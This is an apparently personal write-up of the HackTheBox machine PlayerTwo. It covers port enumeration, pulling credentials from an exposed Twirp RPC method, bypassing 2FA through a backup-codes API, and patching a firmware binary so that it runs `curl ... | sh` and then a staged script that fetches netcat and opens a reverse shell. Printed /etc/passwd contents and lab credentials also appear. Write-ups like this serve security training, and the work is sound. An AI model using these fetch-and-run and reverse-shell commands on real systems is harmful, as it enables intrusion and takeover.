# HTB - PlayerTwo

## Overview

![](../.gitbook/assets/playertwo-infocard.png)

An Insane difficulty Linux machine that tested my web skills quite a bit and also had me doing as much research on new protocols and services as three or four easy or medium boxes would.  Finding each pathway forward wasn't too difficult with proper enumeration, but getting past each step required patience and reading lots of documentation.  

## Useful Skills and Tools

#### Adding a hostname to the hosts file on Linux

In order to get the intended page for a server, sometimes you may need to direct your traffic to the site's FQDN rather than it's IP address.  In order to do this you will need to tell your computer where to find that domain by adding the following line to `/etc/hosts` .   Subdomains need to be added on separate lines.

```text
10.10.10.170    <domain.name>
10.10.10.170    <subdomain.domain.name>
```

#### Using `cewl` to get a site-customized wordlist

```text
cewl -d 3 -o -a -e -w <output_file> <website_url>
```

In order to get a comprehensive wordlist for a site, I use the following options: `-d` depth, `-o` follow links to outside sites, `-a` include metadata, `-e` includes email addresses, and `-w <file>` to write the output to a file named `<file>`.

#### Using `wfuzz` to brute force file names

```text
wfuzz -X GET -w <wordlist> --sc 200  -c http://player2.htb/proto/FUZZ.proto
```

The options used here are: `-X GET` specifies the HTTP command to use, `-w <filename>` specifies which wordlist to use, `--sc 200` tells it to only list HTTP replies that return a code of 200, and `-c` makes the output easier to read with colors.  The command ends with the URL to enumerate, and will substitute any section in the URL where the word `FUZZ` is inserted with each word from the wordlist.

#### Upgrading from a limited shell

After getting a rough shell on the machine, my first order of business is usually moving to a more comfortable shell with all of the creature comforts such as history, tab auto-completion, and the ability to use the arrow keys and `alt-` and `ctrl-` commands.

1. Make sure python is installed with `which python`
2. Use a python one-liner to spawn a `bash` shell with `python -c 'import pty;pty.spawn("/bin/bash")';`
3. Background the shell and return to my machine with ```ctrl-z```
4. Type `stty raw -echo;` to allow sending of raw keyboard input through the pty.  This lets me use `ctrl-c` to kill commands on the other side rather than kill my shell \(for example\).  
5. Type `fg` to bring my shell back to the foreground

## Enumeration

### Nmap scan

I started my enumeration off with an nmap scan of `10.10.10.170`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, and`-oN <name>` saves the output with a filename of `<name>`.  

```text
zweilos@kalimaa:~/htb/playertwo$ nmap -p- -sC -sV -O -oA playertwo.full 10.10.10.170

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-31 13:01 EDT
Nmap scan report for 10.10.10.170
Host is up (0.33s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0e:7b:11:2c:5e:61:04:6b:e8:1c:bb:47:b8:4d:fe:5a (RSA)
|   256 18:a0:87:56:64:06:17:56:4d:6a:8c:79:4b:61:56:90 (ECDSA)
|_  256 b6:4b:fc:e9:62:08:5a:60:e0:43:69:af:29:b3:27:14 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
8545/tcp open  http    (PHP 7.2.24-0ubuntu0.18.04.1)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 31 May 2020 17:29:36 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|     {"code":"bad_route","msg":"no handler for path "/nice%20ports%2C/Tri%6Eity.txt%2ebak"","meta":{"twirp_invalid_route":"GET /nice%20ports%2C/Tri%6Eity.txt%2ebak"}}
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 31 May 2020 17:29:21 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|     {"code":"bad_route","msg":"no handler for path "/"","meta":{"twirp_invalid_route":"GET /"}}
|   HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 31 May 2020 17:29:22 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|     {"code":"bad_route","msg":"no handler for path "/"","meta":{"twirp_invalid_route":"OPTIONS /"}}
|   OfficeScan: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 31 May 2020 17:29:38 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|_    {"code":"bad_route","msg":"no handler for path "/"","meta":{"twirp_invalid_route":"GET /"}}
|_http-title: Site doesn't have a title (application/json).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8545-TCP:V=7.80%I=7%D=5/31%Time=5ED3E880%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,FC,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x20Sun,\x2031\x2
SF:0May\x202020\x2017:29:21\x20GMT\r\nConnection:\x20close\r\nX-Powered-By
SF::\x20PHP/7\.2\.24-0ubuntu0\.18\.04\.1\r\nContent-Type:\x20application/j
SF:son\r\n\r\n{\"code\":\"bad_route\",\"msg\":\"no\x20handler\x20for\x20pa
SF:th\x20\\\"\\/\\\"\",\"meta\":{\"twirp_invalid_route\":\"GET\x20\\/\"}}"
SF:)%r(HTTPOptions,100,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x20Sun,\
SF:x2031\x20May\x202020\x2017:29:22\x20GMT\r\nConnection:\x20close\r\nX-Po
SF:wered-By:\x20PHP/7\.2\.24-0ubuntu0\.18\.04\.1\r\nContent-Type:\x20appli
SF:cation/json\r\n\r\n{\"code\":\"bad_route\",\"msg\":\"no\x20handler\x20f
SF:or\x20path\x20\\\"\\/\\\"\",\"meta\":{\"twirp_invalid_route\":\"OPTIONS
SF:\x20\\/\"}}")%r(FourOhFourRequest,144,"HTTP/1\.1\x20404\x20Not\x20Found
SF:\r\nDate:\x20Sun,\x2031\x20May\x202020\x2017:29:36\x20GMT\r\nConnection
SF::\x20close\r\nX-Powered-By:\x20PHP/7\.2\.24-0ubuntu0\.18\.04\.1\r\nCont
SF:ent-Type:\x20application/json\r\n\r\n{\"code\":\"bad_route\",\"msg\":\"
SF:no\x20handler\x20for\x20path\x20\\\"\\/nice%20ports%2C\\/Tri%6Eity\.txt
SF:%2ebak\\\"\",\"meta\":{\"twirp_invalid_route\":\"GET\x20\\/nice%20ports
SF:%2C\\/Tri%6Eity\.txt%2ebak\"}}")%r(OfficeScan,FC,"HTTP/1\.1\x20404\x20N
SF:ot\x20Found\r\nDate:\x20Sun,\x2031\x20May\x202020\x2017:29:38\x20GMT\r\
SF:nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.24-0ubuntu0\.18\.04
SF:\.1\r\nContent-Type:\x20application/json\r\n\r\n{\"code\":\"bad_route\"
SF:,\"msg\":\"no\x20handler\x20for\x20path\x20\\\"\\/\\\"\",\"meta\":{\"tw
SF:irp_invalid_route\":\"GET\x20\\/\"}}");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=5/31%OT=22%CT=1%CU=37408%PV=Y%DS=2%DC=I%G=Y%TM=5ED3E8B
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1482.37 seconds
```

Despite all of that output, there were only three ports open; SSH and two that returned HTTP data.  The output from `TCP 8545` didn't look like HTML, rather it was reporting a Content-Type of `application/json`.  The message `"twirp_invalid_route"` looked like something to be investigated since nmap couldn't identify it.

### Enumerating `Port 80 - HTTP`

Before jumping off into any potential rabbit holes with the strange output from port 8545, it was best to fire up a browser and first try to connect to the open port 80 at [http://10.10.10.170](http://10.10.10.170).  

![](../.gitbook/assets/1-error.png)

Oops, well that didn't seem to work.  Refreshing the page just brought up this message again.  Looking closer at the output on the page...it says `Firefox can't load this page for some reason.` This is somewhat interesting, considering I was not using Firefox at the time, so I looked at the page source and discovered that it was actually a PNG image rather than text being displayed.  This wasn't an error message so much as the actual page content.  

Looking again at the text in the image, I noticed that it says "Please contact `MrR3boot@player2.htb`."  This looks like a potential username and hostname.  Perhaps redirecting my traffic to `http://player2.htb` would get me different output.  

#### Adding a hostname to the hosts file

In order to get the intended page for a server, sometimes you need to direct your traffic to the site's FQDN rather than it's IP address.  In order to do this you will need to tell your computer where to find that domain by adding the following line to `/etc/hosts`

```text
10.10.10.170    player2.htb 
```

### Enumerating the real website

After adding the domain to the hosts file, navigating to [http://player2.htb](http://player2.htb) led me to the real company website.  By the looks of it, this company has suffered some sort of network breach before and has upped their security standards since.

![](../.gitbook/assets/2-first-site.png)

After reading through the content on the page, I found a link to a subdomain at [http://product.player2.htb/](http://product.player2.htb/). Once again I added the new domain to my hosts file, and after navigating to this new site I found a login page.

```text
10.10.10.170    player2.htb
10.10.10.170    product.player2.htb
```

![](../.gitbook/assets/3-login-page.png)

I tried some basic credentials like `admin:admin` but only got an alert box back saying `Nope.` I figured that I must have to find the credentials somewhere else and decided to check out that other HTTP port I had seen earlier.

### Enumerating `Port 8545`

Opening a browser page and navigating to [http://player2.htb:8545](http://player2.htb:8545) returned a JSON formatted error message. 

```text
{ "code": "bad_route", "msg": "no handler for path \"/\"", "meta": { "twirp_invalid_route": "GET /" } }
```

There was that `"twirp_invalid_route"` message I saw from nmap again.  I decided it was time to do a little research into `twirp` and see if I could find anything useful. 

### Researching twirp

I was quickly able to locate some resources on this protocol, which seems to be a routing method for accessing RPC methods securely.  The following links are the documentation that seemed to describe best how to interact with it.

[https://twitchtv.github.io/twirp/docs/intro.html](https://twitchtv.github.io/twirp/docs/intro.html)[https://github.com/twitchtv/twirp/blob/master/docs/routing.md](https://github.com/twitchtv/twirp/blob/master/docs/routing.md)

The protocol uses a `.proto` file to determine the correct routing for RPC method requests, so I needed to see if I could find that file.  There didn't seem to be a `/rpc` directory as specified in the documentation, so I decided to enumerate folders using `Dirbuster` to see if they had done a non-standard install.  After a while, I found a `/proto` directory at [http://player2.htb/proto/](http://player2.htb/proto/).  

![](../.gitbook/assets/2-dirbuster_player2.htb.png)

I thought that the `/proto` directory seemed like a likely location to place a `.proto` file, but I still didn't know what the name of the file was to access it.  Next, I ran `cewl` against the two websites I had found in order to create a wordlist of likely filenames, but this did not lead anywhere.  It ended up being a standard Dirbuster wordlist that got me the filename.

#### Using `cewl` to get a customized wordlist

```text
cewl -d 3 -o -a -e -w player2.cewl http://player2.htb
```

In order to get a comprehensive wordlist for this site, I used the following options: `-d` depth, `-o` follow links to outside sites, `-a` include metadata, `-e` includes email addresses, and `-w <file>` writes the output to a file named `<file>`.

#### Using `wfuzz` to brute force file names

Using the wordlist from `cewl` first, then later with the standard Dirbuster wordlist, I used the `wfuzz` tool to use fuzzing to try to find out the filename.  Since I was pretty sure the file was in the `/proto` folder, and the filetype was `.proto`, I was able to do some fuzzing against the filename in-between with the format `/proto/FUZZ.proto` .  

```text
zweilos@kalimaa:~/htb/playertwo$ wfuzz -X GET -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --sc 200  -c http://player2.htb/proto/FUZZ.proto

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://player2.htb/proto/FUZZ.proto
Total requests: 87665

===================================================================
ID           Response   Lines    Word     Chars       Payload                               
===================================================================


000034176:   200        18 L     46 W     266 Ch      "generated"
```

After only... a few thousand tries, I got a successful hit using the word `generated`.  The `.proto` file could then be downloaded using the URL [http://player2.htb/proto/generated.proto](http://player2.htb/proto/generated.proto).

### The `.proto` file

The contents of the `generated.proto` file had some very useful information.

```text
syntax = "proto3";

package twirp.player2.auth;
option go_package = "auth";

service Auth {
  rpc GenCreds(Number) returns (Creds);
}

message Number {
  int32 count = 1; // must be > 0
}

message Creds {
  int32 count = 1;
  string name = 2; 
  string pass = 3; 
}
```

The `GenCreds` RPC method in particular sounded like exactly what I was looking for.  Now I needed to figure out how to access this method and see what it could give me.

### Using `twirp` to access RPC methods

The documentation at [https://github.com/twitchtv/twirp/blob/master/docs/routing.md](https://github.com/twitchtv/twirp/blob/master/docs/routing.md) gave the following example using `curl`:

```text
curl --request "POST" \
     --location "http://localhost:8080/twirp/twirp.example.haberdasher.Haberdasher/MakeHat" \
     --header "Content-Type:application/json" \
     --data '{"inches": 10}' \
     --verbose
```

Further reading at [https://twitchtv.github.io/twirp/docs/spec\_v5.html](https://twitchtv.github.io/twirp/docs/spec_v5.html) describes interacting with `twirp`: 

> The **Request-Headers** are normal HTTP headers. The Twirp wire protocol uses the following headers.
>
> * **Content-Type** header indicates the proto message encoding, which should be one of "application/protobuf", "application/json". The server uses this value to decide how to parse the request body, and encode the response body.

> Twirp always uses HTTP POST method to send requests, because it closely matches the semantics of RPC methods.

Since this protocol is able to use standard HTTP requests, I decided to use `Burp Repeater` instead of `curl` so that I could more easily modify and resend requests as I tested them.  

In order to connect to any potential exposed RPC methods through this port, a POST to the RPC method using the format below is required.

```text
POST /twirp/<package>.<Service>/<Method>
```

From the information in the `generated/proto` file I was able to determine that the Package name was `twirp.player2.auth` and the Service was `Auth`.  The method we were trying to access was `GenCreds`.  This made our full Twirp route `/twirp/twirp.player2.auth.Auth/GenCreds`. 

![](../.gitbook/assets/failed-to-parse-request-json.png)

After further testing and reading through the documentation I realized that you had to send some sort of JSON formatted data in the request as well as the proper headers.  

_Make sure to send the `Content-Type:application/json` header as well! Otherwise you will get errors._ 

```text
POST /twirp/twirp.player2.auth.Auth/GenCreds HTTP/1.1
Host: player2.htb:8545
Content-Type:application/json
Content-Length: 27

{"message":"Hello, World!"}
```

After fixing my request and sending it to the server I got the following reply:

```text
HTTP/1.1 200 OK
Host: player2.htb:8545
Date: Wed, 24 Jun 2020 18:30:22 GMT
Connection: close
X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
Content-Type: application/json

{"name":"snowscan","pass":"ze+EKe-SGF^5uZQX"}
```

## Initial Foothold

### Logging into `product.player2.htb`

Finally!  I had some credentials.  I tried to use these creds to log into the site at  [http://product.player2.htb/](http://product.player2.htb/) and got this message:

![Nope.](../.gitbook/assets/4-nope.png)

Since I had taken a short break after successfully crafting my request and taking notes an all, I figured that maybe the credentials it had supplied me were only good for a limited time since they appeared to be randomly generated.  I sent the request through Burp once more to see if it would give a different answer and I got a different set of credentials.  I immediately went to the login site and entered them.

![](../.gitbook/assets/7-new-creds.png)

![Nope.](../.gitbook/assets/4-nope.png)

After playing around with generating credentials, and looking for other ways to login \(SSH did not work, either\) I noticed a pattern in the way the method was giving me credential sets.  It turns out, there were only four possible usernames and four possible passwords.  _I also found out that it didn't seem to matter what data I send to the RPC method, even a blank message worked._  

Usernames:

* mprox
* jkr
* snowscan
* 0xdf

Passwords:

* ze+EKe-SGF^5uZQX
* tR@dQnwnZEk95\*6\#
* XHq7_WJTA?QD_?E2
* Lp-+Q8umLW5\*7qkc

Refusing to give up I tried each combination the server gave me. Nope. a number of times...and then...

![](../.gitbook/assets/5-2fa.png)

I was finally successfully authenticated and redirected to [http://product.player2.htb/totp](http://product.player2.htb/totp).  2FA!  Now I needed to try and figure out how to bypass this two-factor authentication page by somehow getting a Time-based One-Time Password \(TOTP\).  

_Actually, I kind of lied earlier...the first set of credentials it gave me logged me right in and brought me to this page, but it seemed more dramatic this way, especially since I had been so lucky getting the right ones the first time.  The creds it gave me didn't work again shortly after probably because of some internal site error or maybe I fat-fingered pasting it in again.  Shortly after, someone reset the box and I then had to go through the rest of that to get back in. The original creds I got seemed to work every time while doing this writeup.  Doh!_  

### Bypassing Time-based One-Time Password \(TOTP\) 2FA

After my `Dirbuster` scan of the first website earlier had finished, I had also run it against the `product` page as well which led me to discover the `/api` folder.  

![](../.gitbook/assets/2-dirbuster.png)

 I got lucky after that by guessing that there was a TOTP API since the page mentioned backup codes.  This led me to the page [http://product.player2.htb/api/totp](http://product.player2.htb/api/totp).  Navigating to the `/api/totp` page gave me a useful error: 

```text
{"error":"Cannot GET \/"}
```

This looked to be another JSON formatted reply, so I decided to research how to bypass JSON based 2FA.  This led me to [https://c0d3g33k.blogspot.com/2018/02/how-i-bypassed-2-factor-authentication.html](https://c0d3g33k.blogspot.com/2018/02/how-i-bypassed-2-factor-authentication.html).  The author described the message he sent to the server as below, though I didn't have all that information. 

> `{"action":"backup_codes","clusterNum":"000","accountId":"test123","email":"test123@gmail.com"}`

![&quot;invalid\_session&quot;](../.gitbook/assets/6-invalid-session.png)

I tried sending a blank test message using Burp like before, but this gave me an "invalid session" error message, so I determined I probably needed to send the PHPSESSID I saw in my cookies after I logged into the site.  Sending the session ID in a header kept giving me the same error until I realized my mistake. **Need to send the session ID in a** _**COOKIE!!!**_ **** After that, the error message became "invalid action".  

On the 2FA site I saw:

> 2FA You can either use the OTP that we sent to your mobile or the `backup codes` that you have with you.

Emphasis above is mine.  Since I had already noticed on the `/totp` site that I was looking for "backup codes", and the blog above had `{"action":"backup_codes",` in his request, this looked like what I needed.    

```text
POST /api/totp HTTP/1.1
Host: product.player2.htb
Content-Type:application/json
Content-Length: 31
Cookie: PHPSESSID=7987tggfl6k22pq872k2vhqcej

{
  "action":"backup_codes"
}
```

Once I got my request formatted correctly ,and had the proper Cookie header, I got a response from the server.

```text
HTTP/1.1 200 OK
Date: Wed, 24 Jun 2020 23:56:46 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 43
Content-Type: application/json

{"user":"snowscan","code":"84573484857384"}
```

I had my 2FA code!  I used this code on the `/totp` page and was greeted with the page at [http://product.player2.htb/protobs/](http://product.player2.htb/protobs/).  

### The internal protobs page

![](../.gitbook/assets/8-protobs-after2fa.png)

Since it was the name of the product, my first instinct was to test and see if there was a page at http://product.player2.htb/protobs.  

![](../.gitbook/assets/11-protobs-uploader.png)

Yep.  Lucky guess again.  It seemed that I can upload files to go through some sort of verification, which redirected to the page [http://product.player2.htb/protobs/verify](http://product.player2.htb/protobs/verify).  I tried uploading a PHP reverse shell, but it just led to a blank white page and did not send me a shell.  After experimenting with various file uploads and testing for command injection and other things I moved on to explore the rest of the `/home` page.

![](../.gitbook/assets/12-protobs-pdf_link.jpg)

After searching around the site for awhile, I found a very hard to see link under the heading "Get an early access to Protobs".  The background was animated and the explosion kept obscuring the text.  In the screenshot above I have my mouse hovering over the link \(see the URL in the bottom left corner\).  Clicking on this link gave me a pdf at [http://product.player2.htb/protobs.pdf](http://product.player2.htb/protobs.pdf).  

![](../.gitbook/assets/17-protobs-pdf.png)

This document describes the firmware verification process, which is likely what is happening at the `/verify` page I found earlier.

![](../.gitbook/assets/18-protobs-pdf2.png)

 The last page in the PDF confirms this.  It looks like Protobs developers can use the `/protobs/verify` page to test out their firmware before pushing it to customers.  I downloaded the firmware file, and unzipped it.  Inside was an `info` file with copyright information, a `version` file with versioning information, and the `protobs.bin` firmware file.  

### Protobs.bin

Running the `file` command against the `Protobs.bin` file shows that it is just data.

```text
zweilos@kalimaa:~/htb/playertwo$ file Protobs.bin 
Protobs.bin: data
```

However, opening the file in GHex, I can see an ELF header, meaning this is a Linux executable with some data stuffed at the beginning \(most likely the verification signature\).  

![](../.gitbook/assets/19-protobs-ghex.png)

While browsing through the file, I saw a string in the ELF that looks suspiciously like a shell command: `stty raw -echo min 0 time 10`. Since this command was placed in the program as a plain string, perhaps I could replace it with my own command and could possibly get code execution on the remote server. 

### Researching how to replace a section of code inside an ELF executable

I did some research into how to replace a section of code in the ELF, and came up with [https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file](https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file).  This in turn led to: [https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd](https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd).  Using strings to determine the byte offset of the code to replace, then using `dd` it is possible to replace arbitrary code.  However, it seemed to me as if all they were doing was some fancy cut and paste.  

I knew from previous experience from doing CTFs that you could modify the hex code of a file \(and by extension the ASCII strings they represent\) almost as easily as using a regular text editor.  I decided to try "cheating" a bit using GHex. I selected the string I wanted to replace, and wrote my own commands in its place.  I kept it as simple as possible since I didn't know what kind of checks the verification would do, and decided to create a staged payload. I wanted this program to download a script that would be hosted on my local python SimpleHTTPServer.  My code read:`curl 10.10.15.20:8090/a | sh` .  This would download my script called simply `a` and then execute it using `sh`.  _I would have used bash, but nearly every Linux box is guaranteed to have `sh` or at least something aliased to it, and this also saved me a couple characters!_  

```text
#!/bin/sh
#get netcat in case remote system can't '-e'
curl 10.10.15.20:8090/nc -o /dev/shm/nc 
#make netcat executable
chmod +x /dev/shm/nc 
#use netcat reverse shell
/dev/shm/nc 10.10.15.20 12345 -e /bin/sh 
```

Once my script executed, it would then reach back and download netcat \(in case the version on the machine did not have `-e` capability\).  After that it made `nc` executable and created a reverse shell back to my computer which was waiting to catch it.  

![](../.gitbook/assets/16-got-shell%20%281%29.png)

## Road to User

### Upgrading to a usable shell

After getting a rough shell on the machine, my first order of business was moving to a more comfortable shell with all of the creature comforts such as history, tab auto-completion, and the ability to use non-character keys \(such as the arrow keys\).

```text
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")';
www-data@player2:/var/www/product/protobs$ ^Z             
[1]+  Stopped                 nc -lvnp 12345
zweilos@kalimaa:~/htb/playertwo$ stty raw -echo;
zweilos@kalimaa:~/htb/playertwo$ fg
```

First I made sure that python was installed, then upgraded from a limited shell to a more useful one in just a few steps:

1. Use a python one-liner to spawn a `bash` shell with `python -c 'import pty;pty.spawn("/bin/bash")';`
2. Background the shell and return to my machine with ```ctrl-z```
3. Type `stty raw -echo;` to allow sending of raw keyboard input through the pty.  This lets me use `ctrl-c` to kill commands on the other side rather than kill my shell \(for example\).  
4. Type `fg` to bring my shell back to the foreground

### Enumerating as `www-data`

```text

www-data@player2:/var/www/product/protobs$ ls -la
total 48
drwxr-xr-x 5 root     root     4096 Dec 16  2019 .
drwxr-xr-x 6 www-data www-data 4096 Dec  1  2019 ..
-rwxr-xr-x 1 www-data www-data 1176 Sep  3  2019 gen_firm_keys.py
-rw-r--r-- 1 www-data www-data 3410 Nov 10  2019 index.php
dr-x------ 2 www-data www-data 4096 Sep  3  2019 keys
drwxr-xr-x 4 www-data www-data 4096 Sep  5  2019 pihsm
-rw-r--r-- 1 root     root     4711 Dec  1  2019 protobs_firmware_v1.0.tar
-rwxr-xr-x 1 www-data www-data  804 Sep  4  2019 sign_firm.py
drwxrwxrwx 2 www-data www-data 4096 Jun 25 02:54 uploads
-rw-r--r-- 1 www-data www-data 1775 Dec 10  2019 verify.php
-rwxr-xr-x 1 www-data www-data  837 Dec  1  2019 verify_signature.py
```

Next I checked for any password-less sudo permissions with `sudo -l` but there weren't any.  A quick check of the directory I was in showed the back-side code for the website.  

```text
www-data@player2:/home$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
observer:x:1000:1000:observer:/home/observer:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
mosquitto:x:112:115::/var/lib/mosquitto:/usr/sbin/nologin
egre55:x:1001:1001::/home/egre55:/bin/sh
```

A look inside `/etc/passwd` shows three users that can log in: `root`, `egre55`, and `observer` .

```text
www-data@player2:/home$ ls -la
total 12
drwxr-xr-x  3 root     root     4096 Jul 27  2019 .
drwxr-xr-x 23 root     root     4096 Sep  5  2019 ..
drwxr-xr-x  6 observer observer 4096 Nov 16  2019 observer
```

However, the user `egre55` user home folder wasn't visible to me, even though it is specified in `/etc/passwd`.  Looks like `observer` is the most likely avenue for privilege escalation.  

```text
mosquit+   1164  0.0  0.2  48024  5792 ?        S    Jun24   0:05 /usr/sbin/mosquitto -c /etc/mosquitto/mosquitto.conf
root       1177  0.0  1.0 185924 20136 ?        Ssl  Jun24   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       1178  0.0  0.8 337936 17196 ?        Ss   Jun24   0:00 /usr/sbin/apache2 -k start
mysql      1225  0.0  9.7 1490216 189964 ?      Sl   Jun24   0:09 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
root       1527  0.0  0.1  57496  3288 ?        S    Jun24   0:00 /usr/sbin/CRON -f
root       1535  0.0  0.0   4624   864 ?        Ss   Jun24   0:00 /bin/dash -p -c sudo -u egre55 -s /bin/sh -c "/usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php"
root       1541  0.0  0.2  66548  4352 ?        S    Jun24   0:00 sudo -u egre55 -s /bin/sh -c /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php
egre55     1543  0.0  0.0   4624   872 ?        S    Jun24   0:00 /bin/dash -p -c \/bin\/sh -c \/usr\/bin\/php\ -S\ 0\.0\.0\.0\:8545\ \/var\/www\/main\/server\.php
egre55     1544  0.0  0.0   4624   832 ?        S    Jun24   0:00 /bin/dash -p -c /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php
egre55     1545  0.0  1.1 275764 21384 ?        S    Jun24   0:00 /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php
```

Some of the interesting processes that were running are shown above.  Netstat showed two additional ports listening on 127.0.0.1, `port 1883 -> MQQT` and `port 3306 -> MySQL.`After poking around for a bit and not finding anything useful, I decided to start with mosquitto since I hadn't heard of it.  

```text
# Place your local configuration in /etc/mosquitto/conf.d/
# 
# A full description of the configuration file is at
# /usr/share/doc/mosquitto/examples/mosquitto.conf.example

pid_file /var/run/mosquitto.pid

persistence true
persistence_location /var/lib/mosquitto/

log_dest file /var/log/mosquitto/mosquitto.log
bind_address 127.0.0.1
include_dir /etc/mosquitto/conf.d
```

First I started with `/etc/mosquitto/mosquitto.conf` since I had seen it in the `ps aux` output, but there wasn't anything very interesting there.  

### Mosquitto \(MQTT\) Research

* [https://mosquitto.org/](https://mosquitto.org/) [https://book.hacktricks.xyz/pentesting/1883-pentesting-mqtt-mosquitto](https://book.hacktricks.xyz/pentesting/1883-pentesting-mqtt-mosquitto) 
* [https://github.com/Warflop/IOT-MQTT-Exploit](https://github.com/Warflop/IOT-MQTT-Exploit)
* [https://mosquitto.org/man/mosquitto\_pub-1.html](https://mosquitto.org/man/mosquitto_pub-1.html) 
* [https://mosquitto.org/man/mosquitto\_sub-1.html](https://mosquitto.org/man/mosquitto_sub-1.html)
